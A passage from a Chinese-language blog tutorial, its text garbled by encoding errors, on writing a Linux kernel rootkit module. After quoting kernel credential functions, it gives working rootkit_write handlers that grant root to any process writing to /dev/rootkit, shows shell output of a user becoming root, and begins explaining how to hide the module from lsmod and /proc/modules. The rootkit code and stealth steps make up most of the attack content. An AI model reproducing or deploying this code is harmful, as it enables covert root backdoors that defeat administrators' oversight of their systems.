class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">new</span>-&gt;ucounts = get_ucounts(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯<code>linux 6.2</code>ç‰ˆæœ¬ä¸­çš„å‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœä¾æ—§ä¼ å…¥NULLåˆ™ä¼šç›´æ¥è¿”å›NULLå¯¼è‡´å¤±è´¥ã€‚</p><p>ä¸è¿‡è¿™é‡Œæˆ‘åšæ¼”ç¤ºçš„ç¼–è¯‘çš„å†…æ ¸ç‰ˆæœ¬ä¸º5.10æ‰€ä»¥è¿˜æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸€æ–¹å¼è¿›è¡Œæ¼”ç¤ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¿®æ”¹æˆ‘ä»¬çš„ä»»æ„ä¸€ä¸ªå‡½æ•°å†…å®¹ä¸º<code>commit_creds(prepare_kernel_cred(NULL))</code>å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>éšåç›´æ¥å¾€é©±åŠ¨ä¸­å†™å…¥æ•°æ®å³å¯å®ç°ææƒã€‚</p><h3 id="é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ"><a href="#é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ" class="headerlink" title="é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ"></a>é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">       atomic_read(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">       read_cred_subscribers(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">BUG_ON(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(old) &lt; <span class="number">2</span>);</span><br><span class="line">validate_creds(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BUG_ON(atomic_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumpability changes */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment"> * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment"> * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment"> * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment"> * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment"> * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_wmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* alter the thread keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">key_fsuid_changed(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">key_fsgid_changed(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do it</span></span><br><span class="line"><span class="comment"> * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment"> * in set_user().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">inc_rlimit_ucounts(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">alter_cred_subscribers(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send notifications */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆå…³æ³¨ä¸€ä¸‹å‰é¢æåˆ°çš„<code>commit_creds</code>å‡½æ•°ï¼Œå‡½æ•°å¼€å¤´å…ˆé€šè¿‡<code>current</code>å®è·å–åˆ°<code>task_struct</code>ç»“æ„ä½“ï¼Œéšåè·å–åˆ°å†…éƒ¨çš„credï¼Œåé¢å°†<code>task_struct-&gt;real_cred</code>å’Œ<code>task_struct-&gt;cred</code>æˆå‘˜ä¿®æ”¹ä¸ºæ–°ä¼ å…¥çš„credï¼Œæœ€ç»ˆå®ç°äº†æƒé™æ”¹å˜ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦ç›´æ¥ä¿®æ”¹credç»“æ„ä½“æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒæ ·çš„åŠæ³•è·å–å¾—åˆ°credç»“æ„ä½“å¹¶åŠ ä»¥ä¿®æ”¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¾ˆç®€å•çš„å°±å¯ä»¥ä¿®æ”¹ä¸Šè¿°å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">1000</span>(ctf) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ $ echo a &gt; /dev/rootkit </span><br><span class="line">~ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ # </span><br></pre></td></tr></table></figure><p>éšåæˆåŠŸææƒã€‚</p><h2 id="æ¨¡å—éšè—"><a href="#æ¨¡å—éšè—" class="headerlink" title="æ¨¡å—éšè—"></a>æ¨¡å—éšè—</h2><p>ç›®å‰å­˜åœ¨ä¸€ä¸ªååˆ†å°´å°¬çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬è½½å…¥rootkitæ—¶ä¼šå‘ç°åªéœ€è¦lsmodå°±å¯ä»¥çœ‹åˆ°äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ lsmod </span><br><span class="line">rootkit 16384 0 - Live 0x0000000000000000 (E)</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>very_important_module_not_root_kit_please_donot_remove_it</code>å–ä¸€ä¸ªéå¸¸æ­£å¸¸çš„åå­—è®©ç”¨æˆ·ä¸ä¼šçŒœæµ‹æˆ‘ä»¬ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿä¸èƒ½å®Œå…¨ä¿è¯ä¸è¢«å‘ç°ã€‚æ‰€ä»¥æœ€å¥½çš„åŠæ³•å°±æ˜¯è®©ç”¨æˆ·æ— æ³•ç›´æ¥å‘ç°æˆ‘ä»¬çš„rootkitã€‚</p><h3 id="proc-modulesä¿¡æ¯éšè—"><a href="#proc-modulesä¿¡æ¯éšè—" class="headerlink" title="/proc/modulesä¿¡æ¯éšè—"></a>/proc/modulesä¿¡æ¯éšè—</h3><p>Linux ä¸‹ç”¨ä»¥æŸ¥çœ‹æ¨¡å—çš„å‘½ä»¤ <code>lsmod</code> å…¶å®æ˜¯ä» <code>/proc/modules</code> è¿™ä¸ªæ–‡ä»¶ä¸­è¯»å–å¹¶è¿›è¡Œæ•´ç†ï¼Œè¯¥æ–‡ä»¶çš„å†…å®¹æ¥è‡ªäºå†…æ ¸ä¸­çš„ module åŒå‘é“¾è¡¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°† rootkit ä»åŒå‘é“¾è¡¨ä¸­ç§»é™¤å³å¯å®Œæˆ procfs ä¸­çš„éšè—ã€‚</p><p>æ‰€ä»¥è¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹å†…æ ¸ä¸­çš„<code>module</code>åŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">module_state</span> <span class="title">state</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Member of list of modules */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unique handle for this module */</span></span><br><span class="line"><span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_STACKTRACE_BUILD_ID</span></span><br><span class="line"><span class="comment">/* Module build ID */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> build_id[BUILD_ID_SIZE_MAX];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sysfs stuff. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_kobject</span> <span class="title">mkobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_attribute</span> *<span class="title">modinfo_attrs</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *version;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *srcversion;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">holders_dir</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exported symbols */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">syms</span>;</span></span><br><span class="line"><span class="keyword">const</span> s32 *crcs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_syms;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_CFI_TRAPS</span></span><br><span class="line">s32 *kcfi_traps;</span><br><span class="line">s32 *kcfi_traps_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Kernel parameters. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">param_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_param</span> *<span class="title">kp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_kp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GPL-only exported symbols. */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_gpl_syms;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">gpl_syms</span>;</span></span><br><span class="line"><span class="keyword">const</span> s32 *gpl_crcs;</span><br><span class="line"><span class="keyword">bool</span> using_gplonly_symbols;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_SIG</span></span><br><span class="line"><span class="comment">/* Signature was verified. */</span></span><br><span class="line"><span class="keyword">bool</span> sig_ok;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> async_probe_requested;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exception table */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_exentries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exception_table_entry</span> *<span class="title">extable</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Startup function. */</span></span><br><span class="line"><span class="keyword">int</span> (*init)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_memory</span> <span class="title">mem</span>[<span class="title">MOD_MEM_NUM_TYPES</span>] __<span class="title">module_memory_align</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Arch-specific module values */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_arch_specific</span> <span class="title">arch</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> taints;<span class="comment">/* same bits as kernel:taint_flags */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_GENERIC_BUG</span></span><br><span class="line"><span class="comment">/* Support for BUG */</span></span><br><span class="line"><span class="keyword">unsigned</span> num_bugs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">bug_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bug_entry</span> *<span class="title">bug_table</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KALLSYMS</span></span><br><span class="line"><span class="comment">/* Protected by RCU and/or module_mutex: use rcu_dereference() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> __<span class="title">rcu</span> *<span class="title">kallsyms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> <span class="title">core_kallsyms</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Section attributes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_sect_attrs</span> *<span class="title">sect_attrs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notes attributes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_notes_attrs</span> *<span 